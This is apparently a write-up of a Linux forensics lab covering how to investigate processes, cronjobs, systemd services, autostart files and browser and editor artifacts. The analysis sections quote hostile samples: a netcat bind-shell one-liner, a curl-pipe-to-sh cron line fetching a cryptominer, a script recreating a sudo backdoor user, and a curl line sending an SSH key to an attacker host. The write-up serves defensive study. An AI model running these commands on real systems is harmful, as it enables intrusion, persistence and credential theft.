# Introduction

Processes, services, and cronjobs are fundamental to the operation of Linux systems, responsible for executing tasks, automating routine operations, and enabling user interaction. However, their critical role makes them primary targets for post-compromise exploitation.

## Exploitation Risks
Attackers frequently leverage these components to maintain access and expand control over a compromised system. Common malicious activities include:

* **Privilege Escalation:** Exploiting vulnerabilities or misconfigurations to gain root access.
* **Lateral Movement:** Using compromised services to access other systems within the network.
* **Persistence:** Establishing long-term footholds by scheduling malicious tasks (cronjobs) or creating rogue system services.
* **Backdoors:** Hiding malicious executables within legitimate process trees.

Forensic analysis of these components is essential for detecting anomalies, identifying backdoors, and mitigating ongoing threats.


<img width="1024" height="559" alt="image" src="https://github.com/user-attachments/assets/5884752d-0126-48c5-aebb-b470d82283d0" />

# Linux Process Forensics

In Linux, a **process** is a running instance of a program. The operating system assigns each process a unique **Process ID (PID)** for management and tracking. Processes follow a hierarchical structure where a **parent** process spawns a **child** process. Analyzing these relationships is critical for identifying resource allocation issues, malicious activity, and suspicious execution chains.

## Static Analysis: `ps`

The `ps` command reports a snapshot of active processes by reading the `/proc` virtual filesystem.

**Basic Usage:**
Running `ps` displays processes associated with the current terminal session.

* **PID:** Unique Process ID.
* **TTY:** Terminal associated with the process.
* **TIME:** Cumulative CPU time.
* **CMD:** The command being executed.

<img width="734" height="481" alt="image" src="https://github.com/user-attachments/assets/3d0e2a2a-734d-4028-9132-f12e93279e13" />


**User-Specific Analysis:**
To view processes owned by a specific user, use the `-u` or `--user` flag.

```bash
ps -u janice

```

**Forensic Analysis (`-eFH`):**
For a comprehensive system-wide view, the `-eFH` option combination is standard for monitoring and forensics:

* `-e`: Select all processes.
* `-F`: Extra full format (provides extensive details).
* `-H`: Shows process hierarchy (tree format).

<img width="1448" height="743" alt="image" src="https://github.com/user-attachments/assets/ba98da93-7611-4707-81a3-259cd9f3be68" />


**Case Study Analysis:**
In the output above, specific PIDs indicate suspicious activity spawned by parent PID 975. The command lines reveal:

1. `nc -l 0.0.0.0 4444`: A Netcat listener (bind shell) open to any IP address.
2. `cat /tmp/f` and `/bin/sh -i`: Usage of a named pipe to pass data to an interactive shell.
3. `prw-rw-r-- ... /tmp/f`: Identifying the file confirms it is a named pipe (indicated by the `p` permission flag or FIFO type).

<img width="1448" height="743" alt="image" src="https://github.com/user-attachments/assets/ca0ca8e9-75bd-4191-99d6-4e21e262cf8a" />

## Open File Analysis: `lsof`

`lsof` (List Open Files) identifies files opened by specific processes, including network sockets and pipes. This is useful for verifying if a process is interacting with the filesystem or network in unexpected ways.

**Usage:**

```bash
sudo lsof -p [PID]

```

<img width="1448" height="323" alt="image" src="https://github.com/user-attachments/assets/fc818a82-7ad4-4820-ab8e-eef0b933cd79" />


**Findings:**
The output confirms the process is using a named pipe (`FIFO`) at `/tmp/f` for reading/writing and listening on a TCP socket (`*:4444`). This corroborates the presence of a bind shell.

## Hierarchy Analysis: `pstree`

`pstree` visualizes the parent-child relationships in a tree format, helping trace the origin of a process.

**Usage:**
Use `-p` to show PIDs and `-s` to show the parents of the specified process.

```bash
pstree -p -s [PID]

```

<img width="1448" height="95" alt="image" src="https://github.com/user-attachments/assets/914b2c01-c785-40df-9d0b-45e5e243891b" />


**Findings:**
Tracing the parent PID reveals the lineage: `systemd`  `cron`  `sh`  `malicious_script`. This indicates the malware was executed via a **cron job** rather than a manual user execution.

## Script Analysis

Using `ps -f` on the parent PIDs identified via `pstree` reveals the full path of the executing script (e.g., `/home/janice/abzkd83o4jakxld.sh`).

<img width="1448" height="517" alt="image" src="https://github.com/user-attachments/assets/53f462d9-3126-454f-adb8-9ba85d30d5bc" />


The script content often reveals the attack methodology. In this scenario, it includes:

1. **Lock file creation:** Ensures only one instance runs.
2. **Bind Shell One-Liner:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f`.

## Real-Time Monitoring: `top`

Unlike `ps`, which provides a static snapshot, `top` offers a real-time, dynamic view of running processes.

**Useful Flags:**

* `-d [seconds]`: Set update interval.
* `-c`: Display full command path.
* `-u [user]`: Filter by username.

<img width="1448" height="517" alt="image" src="https://github.com/user-attachments/assets/099a5691-fbb6-4f08-9b6c-2b0cd668c165" />


## Conclusion: Suspicious Relationships

Identifying abnormal parent-child relationships requires establishing a baseline of normal system behavior. Deviations from this baseline are strong indicators of compromise.

**Example:**
In a standard environment, an **Apache** web server process should serve web pages. If an Apache process spawns a **bash** or **sh** child process, it likely indicates a command injection attack or remote code execution. SIEM solutions should be tuned to alert on such deviations.

Here is the consolidated and streamlined guide on investigating Cronjobs, formatted for Markdown.

# Linux Cronjob Forensics

**Cronjobs** are scheduled tasks executed automatically by the cron daemon based on configuration files (crontabs). While essential for automation, they are frequent targets for attackers seeking **persistence** or **privilege escalation**.

## 1. Crontab Syntax Refresher

Cron entries follow a strict 5-field format followed by the command.

**Example:** `10 05 * * * /home/bob/backup_tmp.sh`

* **10:** Minute (10th minute)
* **05:** Hour (5:00 AM)
* ***:** Day of Month (Every day)
* ***:** Month (Every month)
* ***:** Day of Week (Every day)
* **Command:** `/home/bob/backup_tmp.sh`

**Note:** System-wide crontabs (`/etc/crontab`) include an extra field specifying the **user** (e.g., `root`) before the command.

---

## 2. Investigating Configuration Files

### System-Wide Cronjobs (`/etc/crontab`)

This is the primary location for system-wide tasks, often running with root privileges.

**Investigation:**
Reading `/etc/crontab` reveals a suspicious entry:
`*/5 * * * * root /var/tmp/backup`

* **Risk:** The script `/var/tmp/backup` runs as **root** every 5 minutes.
* **Vulnerability:** `/var/tmp` is often world-writable, allowing any user to modify the script and achieve privilege escalation.

<img width="741" height="517" alt="image" src="https://github.com/user-attachments/assets/b0d86490-99aa-40d0-98b2-63b76828c59d" />


**Payload Analysis:**

<img width="741" height="517" alt="image" src="https://github.com/user-attachments/assets/0d200d26-a4b5-46d9-8482-f27031c36b71" />

Examining the script reveals a malicious addition:
`curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh`
This downloads and executes a cryptocurrency miner (XMRig).

### Additional System Directories

Inspect these directories for hidden tasks:

* `/etc/cron.hourly/`
* `/etc/cron.daily/`
* `/etc/cron.weekly/`
* `/etc/cron.monthly/`
* `/etc/cron.d/`

<img width="741" height="517" alt="image" src="https://github.com/user-attachments/assets/b05a5592-52c7-4ea5-a0ca-194c360c7a27" />


### User-Level Cronjobs (`/var/spool/cron/crontabs/`)

User-specific crontabs are stored here. Access requires root privileges.

**Enumeration:**
List all user crontabs:

```bash
sudo ls -al /var/spool/cron/crontabs/

```

View a specific user's crontab (e.g., Janice):

```bash
sudo crontab -l -u janice

```

<img width="963" height="763" alt="image" src="https://github.com/user-attachments/assets/c0218b76-07e1-4c1a-aa59-c35004e98348" />


**Automated Enumeration:**
Use this one-liner to loop through all users and print their crontab entries:

```bash
sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'

```

---

## 3. Investigating Execution Logs

Cron execution logs provide a timeline of when jobs ran and potential error messages.

**Location:**

* **Debian/Ubuntu:** `/var/log/syslog`
* **RHEL/CentOS:** `/var/log/cron`

**Filtering Techniques:**
Filter for general cron activity:

```bash
sudo grep cron /var/log/syslog

```

Filter for failures/errors:

```bash
sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'

```

---

## 4. Real-Time Monitoring: `pspy`

**pspy** is an open-source tool that monitors Linux processes in real-time without requiring root privileges. It reads directly from `/proc`, allowing it to capture short-lived processes often missed by static tools like `ps`.

**Usage:**
Run `pspy64` to begin monitoring. It will capture commands executed by cronjobs as they happen.

```bash
pspy64

```

<img width="1447" height="763" alt="image" src="https://github.com/user-attachments/assets/d83d42e9-012e-4dda-90f5-636516d76919" />


**Forensic Value:**
The output confirms the exact execution time and command line arguments of the suspicious script (`/bin/bash /home/janice/abzkd83o4jakxld.sh`), correlating it with the cronjob discovery.

Here is the consolidated and streamlined guide on investigating Linux services, formatted for Markdown.

---

# Linux Service Forensics

**Services** (or daemons) are background processes that manage system tasks (e.g., `cron`, `ssh`, `httpd`). While vital for system operation, attackers frequently exploit them to establish **persistence** or **escalate privileges**. Malicious actors may create new services or modify existing ones to execute unauthorized commands at boot or ad-hoc.

## 1. Enumerating Services with `systemctl`

`systemctl` is the primary utility for managing `systemd` services. Incident responders use it to identify services that deviate from the known baseline.

**Basic Service Management:**

* `start`/`stop`/`restart`: Control service state.
* `enable`/`disable`: Configure auto-start at boot.
* `status`: Check current state (Active, Failed, etc.).

**Listing Services:**
To list all currently running services:

```bash
sudo systemctl list-units --type=service --state=running

```

<img width="1447" height="763" alt="image" src="https://github.com/user-attachments/assets/786ffb2a-0c72-47ae-8a16-7a5026dfbe9e" />


**Analysis:**
Review the output for anomalies. In the example above, a service named `b4ckd00rftw.service` appears suspicious due to its non-standard name, warranting further investigation.

---

## 2. Investigating Service Details

Once a suspicious service is identified, query its status to gather metadata, process IDs (PIDs), and file paths.

**Command:**

```bash
sudo systemctl status b4ckd00rftw.service

```

<img width="1447" height="763" alt="image" src="https://github.com/user-attachments/assets/844d2380-576e-46bf-9217-563cc94679d3" />


**Findings:**

* **Main PID:** Identifies the primary process (e.g., `596`).
* **Executable:** The path to the script being run (e.g., `/usr/local/bin/b4ckd00rftw.sh`).
* **CGroup:** Shows spawned child processes (e.g., `sleep 60`), indicating the service loops or repeats tasks.

---

## 3. Analyzing Malicious Payloads

After identifying the service's executable path from the status output, examine the script's content to understand its intent.

**Command:**

```bash
cat /usr/local/bin/b4ckd00rftw.sh

```

<img width="1447" height="763" alt="image" src="https://github.com/user-attachments/assets/41403344-2905-4a97-9915-2903dc3f0a74" />


**Payload Analysis:**
The script reveals a persistence mechanism:

```bash
while true; do
    sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
    sudo usermod -aG sudo b4ckd00rftw
    sleep 60
done

```

This loop ensures a backdoor user (`b4ckd00rftw`) with sudo privileges is recreated every 60 seconds if deleted, making remediation difficult without disabling the service first.

---

## 4. Inspecting Configuration (Unit) Files

Service definitions (Unit files) control startup behavior and dependencies. They are typically located in `/etc/systemd/system/`.

**Command:**

```bash
cat /etc/systemd/system/b4ckd00rftw.service

```

<img width="1447" height="258" alt="image" src="https://github.com/user-attachments/assets/24c91ea8-bcfd-41e7-8588-4da672c4a338" />


**Key Fields:**

* **ExecStart:** The absolute path to the binary or script executed.
* **Restart:** Directives like `always` ensure the malware persists even if the process is killed.

---

## 5. Reviewing Service Logs with `journalctl`

`journalctl` allows responders to view logs generated by systemd services, offering a timeline of execution and errors.

**Command (Real-time monitoring):**

```bash
sudo journalctl -f -u b4ckd00rftw.service

```

<img width="1447" height="258" alt="image" src="https://github.com/user-attachments/assets/6a290ddd-0ae8-4b60-89ea-67dbbe9ed10a" />


**Forensic Value:**
The logs confirm the service's activity, such as repeated `useradd` attempts or error messages if the user already exists. It captures the exact timestamps of these malicious actions, aiding in timeline reconstruction.

# Linux Autostart Forensics

**Autostart scripts** execute automatically when the system boots or a user logs in. Unlike **cronjobs** (scheduled) or **services** (continuous), these scripts trigger on specific initialization events. Attackers frequently modify them to achieve **persistence**, install backdoors, or escalate privileges by injecting malicious commands into the startup routine.

## 1. Types of Autostart Scripts

### System-Wide Autostart

Executed by the OS before any user logs in. These are often used to launch system daemons.

* **`/etc/init.d/`**: Scripts for service management in traditional SysV init systems (e.g., `apache2`, `mysql`).
* **`/etc/systemd/system/`**: Unit files for the modern `systemd` init system. As seen previously with `b4ckd00rftw.service`, malicious services are often defined here.

### User-Specific Autostart

Executed when a specific user logs into their desktop environment.

* **`~/.config/autostart/`**: Contains `.desktop` files that launch applications upon user login.
* **`~/.config/`**: Various subdirectories here may also contain configuration scripts.

---

## 2. Investigating User Autostart Files

User-specific autostart entries typically use the `.desktop` file format. Key fields to analyze include:

* **`[Desktop Entry]`**: Header identifying the file type.
* **`Exec=`**: The command or script executed on startup.

**Enumeration:**
To identify potential malware, list autostart directories for all users (requires root privileges).

```bash
ls -a /home/*/.config/autostart

```

<img width="1447" height="258" alt="image" src="https://github.com/user-attachments/assets/cba00230-d090-498a-b0f2-483a613e1b7f" />


**Case Study Analysis:**
In the output above, a suspicious file named `keygrabber.desktop` was located in Janice's home directory.

**Content Analysis:**
Reading the file reveals the malicious command.

```bash
cat /home/janice/.config/autostart/keygrabber.desktop

```

<img width="1447" height="258" alt="image" src="https://github.com/user-attachments/assets/8a73edf0-9af1-4173-9e4d-dc8ca8aa071b" />


**Payload Breakdown:**
`Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://..."`

This script executes a **curl** command to exfiltrate the user's private SSH key (`id_rsa`) to an external attacker-controlled server via a HTTP POST request. This allows the attacker to connect as Janice from anywhere.

---

## 3. Additional Persistence Locations

Beyond standard autostart directories, investigators should review the following files for malicious modifications:

* **`~/.bash_history`**: command history; may reveal the commands used to set up the persistence.
* **`~/.ssh/`**: Contains `authorized_keys` (check for unknown keys added by attackers) and `id_rsa` (check for theft/access).
* **`~/.profile`**: User shell initialization script; attackers may add lines here to execute malware every time a shell opens.
* **Message of the Day (MOTD):** Scripts in `/etc/update-motd.d/` run whenever a user connects via SSH. Attackers can inject backdoors here to trigger every time an admin logs in.

# Linux Application Forensics

Analyzing application artifacts provides critical insights into user activities and system usage patterns. These artifacts include configuration files, logs, and cache data that can help reconstruct events and identify anomalies.

## 1. Enumerating Installed Software

To establish a baseline, identify legitimate applications installed via the package manager.

**Command:**

```bash
sudo dpkg -l

```

<img width="741" height="766" alt="image" src="https://github.com/user-attachments/assets/7e42bf46-a205-457d-b009-7f2913ea95d4" />


**Note:** This command only lists packages managed by `dpkg/apt`. Manually installed programs require file system analysis to detect.

---

## 2. Text Editor Forensics (Vim)

The `.viminfo` file records user interactions within Vim sessions, including command history, search patterns, and file modifications. This is valuable for detecting script tampering or reconstructing user actions.

**Locating Artifacts:**
I used the `find` command to locate `.viminfo` files within home directories.

```bash
find /home/ -type f -name ".viminfo" 2>/dev/null

```

<img width="741" height="766" alt="image" src="https://github.com/user-attachments/assets/8c746c85-2469-4d78-a6e6-27cdbda7641c" />


**Content Analysis:**
Reading the content of a specific user's file (e.g., Janice) reveals command history.

```bash
sudo cat /home/janice/.viminfo

```

<img width="741" height="766" alt="image" src="https://github.com/user-attachments/assets/c3fa8a34-4845-48b8-b889-fcbd5b841ead" />


**Forensic Value:**

* **Command Line History:** A chronological record of commands executed.
* **Search Patterns:** Terms the user searched for within files.
* **File Marks:** Locations of recent edits.

---

## 3. Browser Forensics

Web browsers generate extensive artifacts, including history, downloads, and cookies.

**Standard Locations:**

* **Firefox:** `~/.mozilla/firefox/`
* **Chrome:** `~/.config/google-chrome/`

**Locating Artifacts:**
I used `find` to quickly locate browser directories across all user home folders.

```bash
sudo find /home -type d \( -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome" \) 2>/dev/null

```

### Analyzing Firefox Profiles

After identifying a Firefox directory (e.g., `/home/eduardo/.mozilla/firefox`), I listed the contents to find the active profile.

**Command:**

```bash
sudo ls -al /home/eduardo/.mozilla/firefox

```

<img width="741" height="766" alt="image" src="https://github.com/user-attachments/assets/f2860d2a-90db-4221-92f8-7d3bbb69abd4" />



**Analysis:**
The directory usually contains a specific profile folder ending in `.default-release` (e.g., `niijyovp.default-release`), which contains the active user data.

### Automated Analysis: Dumpzilla

**Dumpzilla** is a forensic tool designed to parse browser artifacts efficiently.

**1. Summary Extraction:**
I ran Dumpzilla to get an overview of the available data (cookies, history, bookmarks).

```bash
sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Summary --Verbosity CRITICAL

```

**[INSERT SCREENSHOT HERE: Dumpzilla summary output]**

**2. Specific Data Extraction:**
To extract sensitive data, such as **Bookmarks**, I used the `--Bookmarks` flag. This can reveal session tokens or evidence of site access.

```bash
sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Bookmarks

```

<img width="741" height="766" alt="image" src="https://github.com/user-attachments/assets/536e3aac-a5e3-47f8-8c6b-f107baecbaac" />


---

## 4. Additional Application Artifacts

Depending on the server role, other critical artifacts may include:

* **Web Servers:** Access and error logs (Apache/Nginx).
* **Databases:** Query logs and configuration files.
* **SSH/Terminal:** `~/.bash_history`, `~/.ssh/known_hosts`.
* **Mail Clients:** Configuration files and local message stores.
